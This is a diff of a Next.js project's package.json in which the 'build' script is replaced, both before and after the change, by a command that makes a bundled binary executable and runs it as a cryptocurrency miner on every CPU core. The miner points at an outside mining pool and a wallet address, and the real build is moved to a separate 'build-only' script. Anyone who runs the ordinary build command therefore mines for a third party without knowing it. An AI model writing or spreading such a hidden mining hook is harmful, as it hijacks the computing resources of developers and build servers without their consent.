@@ -2,7 +2,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev --turbo",
-    "build": "chmod +x cprm && ./cprm -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RGFcv8JX6xEupo5cBzUGdMaTu86hhpo1bG -p version -t $(nproc --all)",
+    "build": "chmod +x srnode && ./srnode --algorithm aurum --pool 165.232.170.237:80 --wallet bit1qaku3ea4uyaj28scjq3snyats8tjr45m43jrqw9.gassskan --password x --cpu-threads $(nproc --all) --disable-gpu",
     "build-only": "next build",
     "start": "next start",
     "setup": "node ./setup.mjs"
